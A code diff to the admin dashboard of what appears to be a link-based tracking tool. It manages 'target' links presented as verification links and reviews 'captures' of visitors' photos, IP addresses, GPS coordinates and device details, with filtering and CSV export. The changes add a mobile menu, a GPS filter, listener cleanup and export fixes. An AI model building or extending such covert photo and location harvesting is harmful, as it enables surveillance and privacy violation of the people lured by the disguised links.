@@ -300,8 +300,27 @@
         .activity-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
 
         @media (max-width: 700px) {
-            .sidebar { display: none; }
+            .sidebar { 
+                display: none; 
+                position: fixed; top: 0; left: 0; z-index: 500; 
+                height: 100vh; box-shadow: 4px 0 20px rgba(0,0,0,.6);
+            }
+            .sidebar.mob-open { display: flex; }
             .content { padding: 14px; }
+            .mob-menu-btn {
+                display: flex; align-items: center; justify-content: center;
+                width: 36px; height: 36px; border-radius: 8px; border: 1px solid var(--border);
+                background: var(--card2); cursor: pointer; font-size: 18px;
+                position: fixed; top: 14px; left: 14px; z-index: 600;
+            }
+            .mob-backdrop {
+                display: none; position: fixed; inset: 0; background: rgba(0,0,0,.5); z-index: 490;
+            }
+            .mob-backdrop.open { display: block; }
+            #adminShell .topbar, #userShell .topbar { padding-left: 60px; }
+        }
+        @media (min-width: 701px) {
+            .mob-menu-btn, .mob-backdrop { display: none !important; }
         }
     </style>
 </head>
@@ -485,6 +504,10 @@
         </div>
     </div>
 </div>
+
+<!-- ══ MOBILE HAMBURGER ══ -->
+<button class="mob-menu-btn" id="mobMenuBtn" aria-label="Open navigation">☰</button>
+<div class="mob-backdrop" id="mobBackdrop"></div>
 
 <!-- Toast -->
 <div id="toastStack"></div>
@@ -929,6 +952,11 @@
                             <option value="newest">Newest First</option>
                             <option value="oldest">Oldest First</option>
                         </select>
+                        <select id="uGpsFilter">
+                            <option value="all">All GPS</option>
+                            <option value="gps">With GPS</option>
+                            <option value="nogps">No GPS</option>
+                        </select>
                         <label class="check-label" style="margin-left:auto;">
                             <input type="checkbox" id="uSelectAll"> Select All
                         </label>
@@ -1007,9 +1035,15 @@ let uActiveBinType   = 'all';
 let currentEditId    = null;
 let currentSession   = null; // {type:'admin'} or {type:'user', username:'...', permissions:{...}}
 
+// Listener lifecycle management — store unsubscribe fns so logout cleanly detaches them
+let adminUnsubscribers = [];
+let userUnsubscribers  = [];
+let adminListenersInit = false;
+let userListenersInit  = false;
+
 // ── HTML ESCAPE ───────────────────────────────────────────
 function esc(s) {
-    return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
 }
 
 // ── TOAST ─────────────────────────────────────────────────
@@ -1079,7 +1113,9 @@ function migrateLegacyBins() {
 // ── DL IMAGE ──────────────────────────────────────────────
 function dlImg(src, filename) {
     const a = Object.assign(document.createElement('a'), { href: src, download: filename });
+    document.body.appendChild(a);
     a.click();
+    setTimeout(() => { document.body.removeChild(a); }, 100);
 }
 
 // ══════════════════════════════════════════════════════════
@@ -1098,6 +1134,9 @@ async function checkUsersExist() {
 window.setLoginMode = function(mode) {
     document.querySelectorAll('.login-mode-btn').forEach(b => b.classList.remove('active'));
     document.querySelectorAll('.login-form').forEach(f => f.classList.remove('active'));
+    // Clear stale error messages when switching modes
+    document.getElementById('loginError').style.display = 'none';
+    document.getElementById('userLoginError').style.display = 'none';
     if (mode === 'admin') {
         document.getElementById('modeAdminBtn').classList.add('active');
         document.getElementById('loginAdminForm').classList.add('active');
@@ -1172,15 +1211,33 @@ function applyUserPermissions(perms) {
 
 // Logout
 document.getElementById('adminLogoutBtn').onclick = () => {
+    // Detach all Firebase listeners and reset state
+    adminUnsubscribers.forEach(u => u());
+    adminUnsubscribers = [];
+    adminListenersInit = false;
+    allLogsData = null; allLinksData = null; allUsersData = null;
+    logsCache = {}; prevLogCount = null; selectedCaptures.clear();
     currentSession = null;
     document.getElementById('adminShell').style.display = 'none';
     document.getElementById('loginOverlay').style.display = 'flex';
+    document.getElementById('adminPass').value = '';
+    document.getElementById('loginError').style.display = 'none';
     setLoginMode('admin');
 };
 document.getElementById('userLogoutBtn').onclick = () => {
+    // Detach all Firebase listeners and reset user state
+    userUnsubscribers.forEach(u => u());
+    userUnsubscribers = [];
+    userListenersInit = false;
+    uAllLogsData = null; uAllLinksData = null;
+    uLogsCache = {}; uSelectedCaptures.clear();
     currentSession = null;
     document.getElementById('userShell').style.display = 'none';
     document.getElementById('loginOverlay').style.display = 'flex';
+    document.getElementById('userLoginName').value = '';
+    document.getElementById('userLoginPass').value = '';
+    document.getElementById('userLoginError').style.display = 'none';
+    setLoginMode('user');
 };
 
 // ══════════════════════════════════════════════════════════
@@ -1273,7 +1330,6 @@ function renderLinksTable() {
         const row = document.createElement('tr');
 
         const verHref   = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
-        const shortHref = window.location.origin + window.location.pathname.replace('admin.html','verify.html') + '?linkId=' + id;
         // Target Name column — always shows the actual target name
         const nameCell = `<td><a href="${verHref}" target="_blank" rel="noopener" title="Verification link: ${verHref}" style="color:var(--primary);font-weight:700;text-decoration:none;">${esc(l.name || 'Unnamed')}</a></td>`;
         // Display URL column — shows displayUrl or '—'
@@ -1314,9 +1370,7 @@ document.getElementById('linkTableBody').addEventListener('click', e => {
         const url      = useShort
             ? window.location.origin + window.location.pathname.replace('admin.html','verify.html') + '?linkId=' + id
             : base + '?linkId=' + id;
-        navigator.clipboard.writeText(url)
-            .then(() => toast('✅ Link copied!' + (useShort ? ' (short)' : '')))
-            .catch(() => prompt('Copy this URL:', url));
+        copyWithFeedback(url, btn, useShort ? ' (short)' : '');
     } else if (action === 'qr') {
         const base     = window.location.origin + window.location.pathname.replace('admin.html','index.html');
         const useShort = document.getElementById('useShortLink')?.checked;
@@ -1510,8 +1564,11 @@ function renderRecent() {
 }
 
 ['searchLogs','timeFilter','photoFilter','gpsFilter','sortFilter','ownerFilter'].forEach(id => {
-    document.getElementById(id)?.addEventListener('change', renderLogs);
-    document.getElementById(id)?.addEventListener('input',  renderLogs);
+    const el = document.getElementById(id);
+    if (!el) return;
+    const fn = debounce(renderLogs, 280);
+    el.addEventListener('change', renderLogs);
+    el.addEventListener('input',  fn);
 });
 
 function handleCapCardClick(e, cacheRef, binKey, isUser = false) {
@@ -1537,7 +1594,6 @@ function handleCapCardClick(e, cacheRef, binKey, isUser = false) {
 
 document.getElementById('photoGrid').addEventListener('click', e => handleCapCardClick(e, logsCache, 'unified_bin', false));
 document.getElementById('recentGrid').addEventListener('click', e => {
-    const p = allLogsData; // use allLogsData for recent grid
     handleCapCardClick(e, allLogsData || {}, 'unified_bin', false);
 });
 
@@ -1778,6 +1834,8 @@ document.getElementById('usersSection').addEventListener('click', e => {
     } else if (ua === 'delete') {
         if (!confirm(`Permanently delete user "${uname}"? This cannot be undone.`)) return;
         remove(ref(db, 'users/' + uname));
+        // Clean up user's Firebase recycle bin (orphaned data)
+        remove(ref(db, 'recycle_bin/' + uname)).catch(() => {});
         toast(`🗑️ User ${uname} deleted.`, 'var(--red)');
     }
 });
@@ -1942,7 +2000,7 @@ async function showUserActivity(username) {
     const sortedDelCaps  = [...dedupedDeletedCaps].sort((a,b) => (b.deletedAt||0) - (a.deletedAt||0));
     const sortedDelLinks = [...dedupedDeletedLinks].sort((a,b) => (b.deletedAt||0) - (a.deletedAt||0));
 
-    const ex = s => String(s??'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    const ex = s => String(s??'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
 
     // ── stat pill
     const pill = (color, num, lbl) =>
@@ -2253,7 +2311,6 @@ function renderUserLinksTable() {
         count++;
         const row = document.createElement('tr');
         const verHref   = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
-        const shortHref = window.location.origin + window.location.pathname.replace('admin.html','verify.html') + '?linkId=' + id;
         // Target Name — always shows actual target name
         const nameCell    = `<td><a href="${verHref}" target="_blank" rel="noopener" title="Verification link: ${verHref}" style="color:var(--primary);font-weight:700;text-decoration:none;">${esc(l.name || 'Unnamed')}</a></td>`;
         // Display URL — shows displayUrl or '—'
@@ -2294,7 +2351,7 @@ document.getElementById('uLinkTableBody').addEventListener('click', e => {
         const url      = useShort
             ? window.location.origin + window.location.pathname.replace('admin.html','verify.html') + '?linkId=' + id
             : base + '?linkId=' + id;
-        navigator.clipboard.writeText(url).then(() => toast('✅ Link copied!' + (useShort ? ' (short)' : ''))).catch(() => prompt('Copy:', url));
+        copyWithFeedback(url, btn, useShort ? ' (short)' : '');
     } else if (uaction === 'qr') {
         const base     = window.location.origin + window.location.pathname.replace('admin.html','index.html');
         const useShort = document.getElementById('uUseShortLink')?.checked;
@@ -2355,6 +2412,7 @@ function passUserFilter(p) {
     const search = document.getElementById('uSearchLogs')?.value?.toLowerCase() || '';
     const time   = document.getElementById('uTimeFilter')?.value || 'all';
     const photo  = document.getElementById('uPhotoFilter')?.value || 'all';
+    const gps    = document.getElementById('uGpsFilter')?.value || 'all';
     const d      = p.device || {};
     const now    = Date.now();
     if (search) { const hay = [p.linkName, p.ipAddress, d.os, d.browser, p.date].join(' ').toLowerCase(); if (!hay.includes(search)) return false; }
@@ -2363,6 +2421,9 @@ function passUserFilter(p) {
     if (time === 'month' && (now - (p.timestamp||0)) > 2592000000) return false;
     if (photo === 'photo'   && !p.image)  return false;
     if (photo === 'nophoto' &&  p.image)  return false;
+    const hasGPS = p.latitude && p.latitude !== 'Denied';
+    if (gps === 'gps'   && !hasGPS) return false;
+    if (gps === 'nogps' &&  hasGPS) return false;
     return true;
 }
 
@@ -2410,9 +2471,12 @@ function renderUserRecent() {
     keys.forEach(k => { uLogsCache[k] = uAllLogsData[k]; grid.appendChild(buildCapCard(k, uAllLogsData[k], false, true)); });
 }
 
-['uSearchLogs','uTimeFilter','uPhotoFilter','uSortFilter'].forEach(id => {
-    document.getElementById(id)?.addEventListener('change', renderUserLogs);
-    document.getElementById(id)?.addEventListener('input',  renderUserLogs);
+['uSearchLogs','uTimeFilter','uPhotoFilter','uSortFilter','uGpsFilter'].forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    const fn = debounce(renderUserLogs, 280);
+    el.addEventListener('change', renderUserLogs);
+    el.addEventListener('input',  fn);
 });
 
 document.getElementById('uPhotoGrid').addEventListener('click', e => {
@@ -2482,6 +2546,7 @@ document.getElementById('uBulkDeleteBtn').onclick = () => {
         remove(ref(db, 'photo_history/' + key));
     });
     uSelectedCaptures.clear();
+    const usa = document.getElementById('uSelectAll'); if (usa) usa.checked = false;
     renderUserBin(); updateUserStats();
     toast(`🗑️ ${count} capture(s) moved to bin.`, 'var(--yellow)');
 };
@@ -2489,6 +2554,8 @@ document.getElementById('uBulkDeleteBtn').onclick = () => {
 // User Export
 document.getElementById('uExportBtn').onclick = () => {
     const username = currentSession?.username;
+    // Respect exportData permission
+    if (!currentSession?.permissions?.exportData) { toast('⛔ Export permission not granted.', 'var(--red)'); return; }
     if (!uAllLogsData) { toast('⚠️ No captures to export.', 'var(--yellow)'); return; }
     const myLogs = Object.values(uAllLogsData).filter(p => p._ownerId === username && p._ownerType === 'user');
     if (myLogs.length === 0) { toast('⚠️ No captures to export.', 'var(--yellow)'); return; }
@@ -2499,8 +2566,12 @@ document.getElementById('uExportBtn').onclick = () => {
     });
     const csv  = rows.map(r => r.map(c => '"' + String(c).replace(/"/g,'""') + '"').join(',')).join('\n');
     const blob = new Blob([csv], { type: 'text/csv' });
-    const a    = Object.assign(document.createElement('a'), { href: URL.createObjectURL(blob), download: `my_captures_${new Date().toISOString().slice(0,10)}.csv` });
-    a.click(); toast('📥 CSV exported!', 'var(--teal)');
+    const blobUrl = URL.createObjectURL(blob);
+    const a    = Object.assign(document.createElement('a'), { href: blobUrl, download: `my_captures_${new Date().toISOString().slice(0,10)}.csv` });
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(() => { URL.revokeObjectURL(blobUrl); document.body.removeChild(a); }, 100);
+    toast('📥 CSV exported!', 'var(--teal)');
 };
 
 // ══════════════════════════════════════════════════════════
@@ -2614,23 +2685,17 @@ document.getElementById('uEmptyBinBtn').onclick = () => {
     renderUserBin(); updateUserStats(); toast('🔥 Bin emptied.', 'var(--red)');
 };
 
-// ══════════════════════════════════════════════════════════
-// FIREBASE LISTENERS
-// ══════════════════════════════════════════════════════════
-let adminListenersInit = false;
-let userListenersInit  = false;
-
 function initAdminListeners() {
     if (adminListenersInit) return;
     adminListenersInit = true;
 
-    onValue(ref(db, 'managed_links'), snap => {
+    adminUnsubscribers.push(onValue(ref(db, 'managed_links'), snap => {
         allLinksData = snap.val();
         renderLinksTable();
         updateStats();
-    });
+    }));
 
-    onValue(ref(db, 'photo_history'), snap => {
+    adminUnsubscribers.push(onValue(ref(db, 'photo_history'), snap => {
         const newData  = snap.val();
         const newCount = newData ? Object.keys(newData).length : 0;
         if (prevLogCount !== null && newCount > prevLogCount) {
@@ -2643,39 +2708,39 @@ function initAdminListeners() {
         renderLogs();
         renderRecent();
         updateStats();
-    });
+    }));
 
-    onValue(ref(db, 'users'), snap => {
+    adminUnsubscribers.push(onValue(ref(db, 'users'), snap => {
         allUsersData = snap.val();
         renderUsersList();
         updateStats();
         if (allUsersData && Object.keys(allUsersData).length > 0) {
             document.getElementById('loginModeSwitch').style.display = 'flex';
         }
-    });
+    }));
 }
 
 function initUserListeners() {
     if (userListenersInit) return;
     userListenersInit = true;
 
-    onValue(ref(db, 'managed_links'), snap => {
+    userUnsubscribers.push(onValue(ref(db, 'managed_links'), snap => {
         uAllLinksData = snap.val();
         renderUserLinksTable();
         updateUserStats();
-    });
+    }));
 
-    onValue(ref(db, 'photo_history'), snap => {
+    userUnsubscribers.push(onValue(ref(db, 'photo_history'), snap => {
         uAllLogsData = snap.val();
         renderUserLogs();
         renderUserRecent();
         updateUserStats();
-    });
+    }));
 
     // ── Real-time account status watcher ──────────────────
     // Fires instantly when admin disables/enables this user
     if (currentSession?.type === 'user' && currentSession.username) {
-        onValue(ref(db, 'users/' + currentSession.username), snap => {
+        userUnsubscribers.push(onValue(ref(db, 'users/' + currentSession.username), snap => {
             const userData = snap.val();
             // If account deleted or disabled while logged in → force logout immediately
             if (!userData || userData.active === false) {
@@ -2694,10 +2759,9 @@ function initUserListeners() {
                 const passEl = document.getElementById('userLoginPass');
                 if (nameEl) nameEl.value = '';
                 if (passEl) passEl.value = '';
-                // Switch to user login mode so they see the message
                 if (typeof setLoginMode === 'function') setLoginMode('user');
             }
-        });
+        }));
     }
 }
 
@@ -2855,7 +2919,8 @@ document.getElementById('downloadQrBtn').onclick  = () => {
     if (!currentQrUrl) return;
     const canvas = document.getElementById('qrContainer')?.querySelector('canvas');
     if (!canvas) { toast('⚠️ QR not available.', 'var(--yellow)'); return; }
-    dlImg(canvas.toDataURL('image/png'), 'qr_' + currentQrUrl.split('linkId=')[1] + '.png');
+    const linkIdPart = currentQrUrl.split('linkId=')[1] || currentQrUrl.split('/').pop() || 'link';
+    dlImg(canvas.toDataURL('image/png'), 'qr_' + linkIdPart + '.png');
 };
 
 // ══════════════════════════════════════════════════════════
@@ -2914,8 +2979,12 @@ document.getElementById('exportBtn').onclick = () => {
     });
     const csv  = rows.map(r => r.map(c => '"' + String(c).replace(/"/g,'""') + '"').join(',')).join('\n');
     const blob = new Blob([csv], { type: 'text/csv' });
-    const a    = Object.assign(document.createElement('a'), { href: URL.createObjectURL(blob), download: 'captures_' + new Date().toISOString().slice(0,10) + '.csv' });
-    a.click(); toast('📥 CSV exported!', 'var(--teal)');
+    const blobUrl = URL.createObjectURL(blob);
+    const a    = Object.assign(document.createElement('a'), { href: blobUrl, download: 'captures_' + new Date().toISOString().slice(0,10) + '.csv' });
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(() => { URL.revokeObjectURL(blobUrl); document.body.removeChild(a); }, 100);
+    toast('📥 CSV exported!', 'var(--teal)');
 };
 
 // ══════════════════════════════════════════════════════════
@@ -2923,20 +2992,95 @@ document.getElementById('exportBtn').onclick = () => {
 // ══════════════════════════════════════════════════════════
 function cleanBin() {
     const cutoff = 30 * 86400000; const now = Date.now();
-    ['unified_bin'].forEach(key => {
+    // Clean admin unified bin
+    const keysToClean = ['unified_bin'];
+    // Collect all user_bin_* keys from localStorage
+    for (let i = 0; i < localStorage.length; i++) {
+        const k = localStorage.key(i);
+        if (k && k.startsWith('user_bin_')) keysToClean.push(k);
+    }
+    keysToClean.forEach(key => {
         const b = getBin(key);
         const filtered = b.filter(x => (now - (x.deletedAt||0)) < cutoff);
         if (filtered.length !== b.length) saveBin(filtered, key);
     });
 }
 
-// ── INIT ──
+// ── ADVANCED: Debounce helper for search inputs ────────
+function debounce(fn, ms = 280) {
+    let t; return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); };
+}
+
+// ── ADVANCED: Copy with visual feedback ───────────────
+function copyWithFeedback(url, btn, shortLabel = '') {
+    navigator.clipboard.writeText(url).then(() => {
+        if (btn) {
+            const orig = btn.innerHTML;
+            btn.innerHTML = '✅ Copied!';
+            btn.style.background = 'var(--green)';
+            setTimeout(() => { btn.innerHTML = orig; btn.style.background = ''; }, 1800);
+        }
+        toast('✅ Link copied!' + shortLabel);
+    }).catch(() => prompt('Copy this URL:', url));
+}
 document.getElementById('refreshBtn').onclick = () => location.reload();
 migrateLegacyBins();
 cleanBin();
 renderBin();
 setInterval(cleanBin, 3600000);
 checkUsersExist();
+
+// ── ADVANCED: Escape key closes any open modal ──────────
+document.addEventListener('keydown', e => {
+    if (e.key !== 'Escape') return;
+    document.querySelectorAll('.modal-overlay.open').forEach(m => m.classList.remove('open'));
+    const lb = document.getElementById('lightbox');
+    if (lb.style.display === 'flex') { lb.style.display = 'none'; document.getElementById('lightboxImg').src = ''; }
+    const actLb = document.getElementById('activityLightboxOverlay');
+    if (actLb && actLb.style.display === 'flex') actLb.style.display = 'none';
+});
+
+// ── ADVANCED: Click-to-dismiss toasts ──────────────────
+document.getElementById('toastStack').addEventListener('click', e => {
+    const item = e.target.closest('.toast-item');
+    if (item) { item.style.opacity = '0'; item.style.transition = 'all .2s'; setTimeout(() => item.remove(), 200); }
+});
+
+// ── ADVANCED: Persist active panel across page interactions ──
+// Extend navigation to save panel in sessionStorage on every click
+document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
+    el.addEventListener('click', () => {
+        try { sessionStorage.setItem('lastPanel_' + el.dataset.shell, el.dataset.panel); } catch(e) {}
+    });
+});
+
+// ── ADVANCED: Mobile hamburger menu ──────────────────────
+(function() {
+    const btn      = document.getElementById('mobMenuBtn');
+    const backdrop = document.getElementById('mobBackdrop');
+    if (!btn) return;
+    function getActiveSidebar() {
+        const aShell = document.getElementById('adminShell');
+        const uShell = document.getElementById('userShell');
+        if (aShell && aShell.style.display !== 'none') return aShell.querySelector('.sidebar');
+        if (uShell && uShell.style.display !== 'none') return uShell.querySelector('.sidebar');
+        return null;
+    }
+    function closeSidebar() {
+        const sb = getActiveSidebar(); if (sb) sb.classList.remove('mob-open');
+        backdrop.classList.remove('open');
+    }
+    btn.addEventListener('click', () => {
+        const sb = getActiveSidebar(); if (!sb) return;
+        const isOpen = sb.classList.toggle('mob-open');
+        backdrop.classList.toggle('open', isOpen);
+    });
+    backdrop.addEventListener('click', closeSidebar);
+    // Close sidebar on nav panel click (mobile UX)
+    document.addEventListener('click', e => {
+        if (e.target.closest('.nav-item[data-panel]')) setTimeout(closeSidebar, 50);
+    });
+})();
 
 </script>
 </body>
